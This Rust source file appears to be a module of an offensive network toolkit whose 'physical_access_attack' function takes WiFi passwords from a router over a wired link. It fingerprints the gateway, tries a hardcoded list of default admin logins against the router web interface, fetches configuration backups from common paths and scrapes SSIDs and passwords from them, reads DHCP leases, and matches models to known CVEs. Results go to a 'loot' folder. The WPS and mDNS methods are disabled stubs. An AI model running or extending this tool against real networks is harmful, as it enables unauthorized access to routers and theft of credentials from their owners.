use std::{fs, path::Path, thread, time::Duration};

use anyhow::{anyhow, Result};
use tracing::{debug, info, warn};
use regex::Regex;
use serde::{Deserialize, Serialize};
use crate::redact;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WifiCredential {
    pub ssid: String,
    pub password: Option<String>,
    pub security: String,
    pub source: String, // "router_config", "dhcp_leak", "mdns", "upnp"
}

#[derive(Debug, Clone, Serialize)]
pub struct PhysicalAccessReport {
    pub wifi_credentials: Vec<WifiCredential>,
    pub router_model: Option<String>,
    pub router_firmware: Option<String>,
    pub admin_url: Option<String>,
    pub default_credentials_tried: Vec<(String, String, bool)>,
    pub vulnerabilities: Vec<String>,
}

/// Main physical access attack - extract WiFi password from wired connection
pub fn physical_access_attack(interface: &str, root: &Path) -> Result<PhysicalAccessReport> {
    info!(
        target: "net",
        iface = %interface,
        "physical_access_start"
    );

    let mut report = PhysicalAccessReport {
        wifi_credentials: Vec::new(),
        router_model: None,
        router_firmware: None,
        admin_url: None,
        default_credentials_tried: Vec::new(),
        vulnerabilities: Vec::new(),
    };

    // Step 1: Get gateway/router IP
    let gateway = get_gateway_ip(interface)?;
    info!(target: "net", gateway = %gateway, "physical_access_gateway");

    // Step 2: Fingerprint router
    if let Ok((model, firmware)) = fingerprint_router(&gateway) {
        report.router_model = Some(model);
        report.router_firmware = Some(firmware);
    }

    // Step 3: Try multiple extraction methods

    // Method 1: DHCP info leakage
    if let Ok(creds) = extract_from_dhcp(interface) {
        report.wifi_credentials.extend(creds);
    }

    // Method 2: mDNS/Bonjour discovery
    if let Ok(creds) = extract_from_mdns(&gateway) {
        report.wifi_credentials.extend(creds);
    }

    // Method 3: UPnP IGD extraction
    if let Ok(creds) = extract_from_upnp(&gateway) {
        report.wifi_credentials.extend(creds);
    }

    // Method 4: Router web interface (default creds)
    if let Ok((url, tried)) = try_router_webui(&gateway, report.router_model.as_deref()) {
        report.admin_url = Some(url);
        report.default_credentials_tried = tried;
    }

    // Method 5: WPS PIN attack (if wireless available)
    if let Ok(creds) = try_wps_attack() {
        report.wifi_credentials.extend(creds);
    }

    // Method 6: Configuration backup extraction
    if let Ok(creds) = extract_from_backup(&gateway) {
        report.wifi_credentials.extend(creds);
    }

    // Method 7: Check for known vulnerabilities
    if let Some(ref model) = report.router_model {
        report.vulnerabilities = check_vulnerabilities(model);
    }

    // Save report
    save_report(root, &report)?;

    info!(
        target: "net",
        count = report.wifi_credentials.len(),
        "physical_access_complete"
    );

    Ok(report)
}

/// Get gateway IP from routing table
fn get_gateway_ip(interface: &str) -> Result<String> {
    let gw = crate::system::interface_gateway(interface)?
        .ok_or_else(|| anyhow!("Could not find gateway IP"))?;
    Ok(gw.to_string())
}

/// Fingerprint router model and firmware
fn fingerprint_router(ip: &str) -> Result<(String, String)> {
    // Try HTTP headers
    let client = reqwest::blocking::Client::builder()
        .timeout(Duration::from_secs(5))
        .danger_accept_invalid_certs(true)
        .build()?;

    // Try both HTTP and HTTPS
    for protocol in &["http", "https"] {
        let url = format!("{}://{}", protocol, ip);

        if let Ok(response) = client.get(&url).send() {
            // Check Server header
            if let Some(server) = response.headers().get("server") {
                if let Ok(server_str) = server.to_str() {
                    return Ok((server_str.to_string(), "unknown".to_string()));
                }
            }

            // Check body for model info
            if let Ok(body) = response.text() {
                if let Some(model) = extract_model_from_html(&body) {
                    return Ok((model, "unknown".to_string()));
                }
            }
        }
    }

    // Try UPnP device description
    if let Ok((model, firmware)) = get_upnp_device_info(ip) {
        return Ok((model, firmware));
    }

    Err(anyhow!("Could not fingerprint router"))
}

/// Extract router model from HTML
fn extract_model_from_html(html: &str) -> Option<String> {
    // Common patterns
    let patterns = vec![
        r"(?i)<title>([^<]+)</title>",
        r#"(?i)model["\s:]+([A-Z0-9\-]+)"#,
        r"(?i)Router\s+([A-Z0-9\-]+)",
    ];

    for pattern in patterns {
        if let Ok(re) = Regex::new(pattern) {
            if let Some(caps) = re.captures(html) {
                if let Some(model) = caps.get(1) {
                    return Some(model.as_str().to_string());
                }
            }
        }
    }

    None
}

/// Extract WiFi creds from DHCP information leakage
fn extract_from_dhcp(interface: &str) -> Result<Vec<WifiCredential>> {
    let mut creds = Vec::new();

    // Check DHCP lease file
    let lease_paths = vec![
        "/var/lib/dhcp/dhclient.leases".to_string(),
        "/var/lib/dhclient/dhclient.leases".to_string(),
        format!("/var/lib/dhcp/dhclient.{}.leases", interface),
    ];

    for path in lease_paths {
        if let Ok(content) = fs::read_to_string(&path) {
            // Look for WiFi SSID in option fields
            if let Some(ssid) = extract_ssid_from_dhcp(&content) {
                creds.push(WifiCredential {
                    ssid,
                    password: None,
                    security: "unknown".to_string(),
                    source: "dhcp_leak".to_string(),
                });
            }
        }
    }

    Ok(creds)
}

fn extract_ssid_from_dhcp(content: &str) -> Option<String> {
    // Some routers leak SSID in DHCP options
    let re = Regex::new(r#"option\s+vendor-encapsulated-options\s+"([^"]+)""#).ok()?;

    if let Some(caps) = re.captures(content) {
        if let Some(ssid) = caps.get(1) {
            return Some(ssid.as_str().to_string());
        }
    }

    None
}

/// Extract WiFi creds from mDNS/Bonjour
fn extract_from_mdns(_gateway: &str) -> Result<Vec<WifiCredential>> {
    warn!("mDNS extraction disabled (avahi-browse removed, no Rust replacement yet)");
    Ok(Vec::new())
}

/// Extract WiFi creds from UPnP IGD (Internet Gateway Device)
fn extract_from_upnp(gateway: &str) -> Result<Vec<WifiCredential>> {
    let mut creds = Vec::new();

    // Get device description
    if let Ok((_model, _)) = get_upnp_device_info(gateway) {
        // Some routers expose WiFi info via UPnP
        // Try GetInfo action on WLANConfiguration service
        let services = vec![
            "urn:schemas-upnp-org:service:WLANConfiguration:1",
            "urn:schemas-wifialliance-org:service:WFAWLANConfig:1",
        ];

        for service in services {
            if let Ok(info) = query_upnp_service(gateway, service, "GetInfo") {
                if let Some(ssid) = info.get("NewSSID") {
                    let password = info.get("NewPassword").cloned();
                    let security = info
                        .get("NewSecurityMode")
                        .cloned()
                        .unwrap_or_else(|| "unknown".to_string());

                    creds.push(WifiCredential {
                        ssid: ssid.clone(),
                        password,
                        security,
                        source: "upnp".to_string(),
                    });
                }
            }
        }
    }

    Ok(creds)
}

fn get_upnp_device_info(ip: &str) -> Result<(String, String)> {
    let client = reqwest::blocking::Client::builder()
        .timeout(Duration::from_secs(5))
        .build()?;

    // Try common UPnP description URLs
    let paths = vec!["/rootDesc.xml", "/IGD.xml", "/dynsvc/device.xml"];

    for path in paths {
        let url = format!("http://{}{}", ip, path);

        if let Ok(response) = client.get(&url).send() {
            if let Ok(body) = response.text() {
                // Parse XML for model
                if let Some(model) = extract_xml_value(&body, "modelName") {
                    let firmware = extract_xml_value(&body, "firmwareVersion")
                        .unwrap_or_else(|| "unknown".to_string());
                    return Ok((model, firmware));
                }
            }
        }
    }

    Err(anyhow!("Could not get UPnP device info"))
}

fn extract_xml_value(xml: &str, tag: &str) -> Option<String> {
    let pattern = format!(r"<{}>(.*?)</{}>", tag, tag);
    let re = Regex::new(&pattern).ok()?;

    if let Some(caps) = re.captures(xml) {
        if let Some(value) = caps.get(1) {
            return Some(value.as_str().to_string());
        }
    }

    None
}

fn query_upnp_service(
    _ip: &str,
    service: &str,
    action: &str,
) -> Result<std::collections::HashMap<String, String>> {
    // This is a simplified implementation
    // Real implementation would need full SOAP XML parsing
    let result = std::collections::HashMap::new();

    // Try to query service (implementation depends on router)
    debug!("Querying UPnP service {} action {}", service, action);

    Ok(result)
}

/// Try default credentials on router web interface
fn try_router_webui(
    gateway: &str,
    model: Option<&str>,
) -> Result<(String, Vec<(String, String, bool)>)> {
    let mut tried = Vec::new();
    let admin_url = format!("http://{}", gateway);

    // Common default credentials
    let default_creds = get_default_credentials(model);

    let client = reqwest::blocking::Client::builder()
        .timeout(Duration::from_secs(5))
        .danger_accept_invalid_certs(true)
        .build()?;

    for (username, password) in default_creds {
        let redacted_password = redact!(password.clone());
        info!(
            target: "net",
            user = %username,
            pass = %redacted_password,
            gateway = %gateway,
            "router_auth_try"
        );

        // Try basic auth
        let response = client
            .get(&admin_url)
            .basic_auth(&username, Some(&password))
            .send();

        let success = if let Ok(resp) = response {
            resp.status().is_success()
        } else {
            false
        };

        tried.push((username.clone(), password.clone(), success));

        if success {
            let redacted_password = redact!(password.clone());
            info!(
                target: "net",
                user = %username,
                pass = %redacted_password,
                "router_auth_success"
            );
            // Try to extract WiFi config from admin page
            // (implementation would scrape admin interface)
            break;
        }

        thread::sleep(Duration::from_millis(500)); // Rate limiting
    }

    Ok((admin_url, tried))
}

fn get_default_credentials(model: Option<&str>) -> Vec<(String, String)> {
    let mut creds = vec![
        ("admin".to_string(), "admin".to_string()),
        ("admin".to_string(), "password".to_string()),
        ("admin".to_string(), "".to_string()),
        ("root".to_string(), "root".to_string()),
        ("admin".to_string(), "1234".to_string()),
    ];

    // Model-specific defaults
    if let Some(model) = model {
        let model_lower = model.to_lowercase();

        if model_lower.contains("netgear") {
            creds.push(("admin".to_string(), "password".to_string()));
        } else if model_lower.contains("linksys") {
            creds.push(("admin".to_string(), "admin".to_string()));
        } else if model_lower.contains("dlink") || model_lower.contains("d-link") {
            creds.push(("admin".to_string(), "".to_string()));
        } else if model_lower.contains("asus") {
            creds.push(("admin".to_string(), "admin".to_string()));
        } else if model_lower.contains("tplink") || model_lower.contains("tp-link") {
            creds.push(("admin".to_string(), "admin".to_string()));
        }
    }

    creds
}

/// Try WPS PIN attack if wireless interface available
fn try_wps_attack() -> Result<Vec<WifiCredential>> {
    let interfaces = crate::system::list_interface_summaries()?;
    let wireless = interfaces.iter().find(|i| i.kind == "wireless");
    if wireless.is_some() {
        warn!("WPS attack disabled (reaver removed, no Rust replacement)");
    }
    Ok(Vec::new())
}

/// Try to extract credentials from router config backup
fn extract_from_backup(gateway: &str) -> Result<Vec<WifiCredential>> {
    let mut creds = Vec::new();

    // Common backup/config download URLs
    let backup_urls = vec![
        "/cgi-bin/ExportSettings.sh",
        "/backup.conf",
        "/config.xml",
        "/router_backup.cfg",
    ];

    let client = reqwest::blocking::Client::builder()
        .timeout(Duration::from_secs(5))
        .danger_accept_invalid_certs(true)
        .build()?;

    for path in backup_urls {
        let url = format!("http://{}{}", gateway, path);

        if let Ok(response) = client.get(&url).send() {
            if response.status().is_success() {
                if let Ok(body) = response.text() {
                    // Parse config for WiFi credentials
                    if let Some((ssid, password)) = extract_creds_from_config(&body) {
                        creds.push(WifiCredential {
                            ssid,
                            password: Some(password),
                            security: "extracted".to_string(),
                            source: "router_config".to_string(),
                        });
                    }
                }
            }
        }
    }

    Ok(creds)
}

fn extract_creds_from_config(config: &str) -> Option<(String, String)> {
    // Common patterns in config files
    let patterns = vec![
        (
            r#"ssid["\s:=]+([^\s"<>]+)"#,
            r#"password["\s:=]+([^\s"<>]+)"#,
        ),
        (
            r#"wireless_ssid["\s:=]+([^\s"<>]+)"#,
            r#"wireless_password["\s:=]+([^\s"<>]+)"#,
        ),
        (r#"<ssid>([^<]+)</ssid>"#, r#"<password>([^<]+)</password>"#),
    ];

    for (ssid_pattern, pass_pattern) in patterns {
        if let (Ok(ssid_re), Ok(pass_re)) = (Regex::new(ssid_pattern), Regex::new(pass_pattern)) {
            let ssid = ssid_re
                .captures(config)
                .and_then(|c| c.get(1))
                .map(|m| m.as_str().to_string());

            let password = pass_re
                .captures(config)
                .and_then(|c| c.get(1))
                .map(|m| m.as_str().to_string());

            if let (Some(s), Some(p)) = (ssid, password) {
                return Some((s, p));
            }
        }
    }

    None
}

/// Check for known vulnerabilities
fn check_vulnerabilities(model: &str) -> Vec<String> {
    let mut vulns = Vec::new();
    let model_lower = model.to_lowercase();

    // Simplified vulnerability database
    if model_lower.contains("netgear") {
        vulns.push("CVE-2016-6277: Password disclosure vulnerability".to_string());
    }
    if model_lower.contains("dlink") {
        vulns.push("CVE-2019-16920: Unauthenticated remote code execution".to_string());
    }
    if model_lower.contains("asus") {
        vulns.push("InfoLeak: NVRAM dump via LAN port".to_string());
    }

    vulns
}

/// Save physical access report
fn save_report(root: &Path, report: &PhysicalAccessReport) -> Result<()> {
    let loot_dir = root.join("loot").join("PhysicalAccess");
    fs::create_dir_all(&loot_dir)?;

    let timestamp = chrono::Local::now().format("%Y-%m-%d_%H-%M-%S");
    let filename = format!("physical_access_{}.json", timestamp);
    let path = loot_dir.join(filename);

    let json = serde_json::to_string_pretty(report)?;
    fs::write(&path, json)?;

    info!("Physical access report saved to {}", path.display());
    Ok(())
}
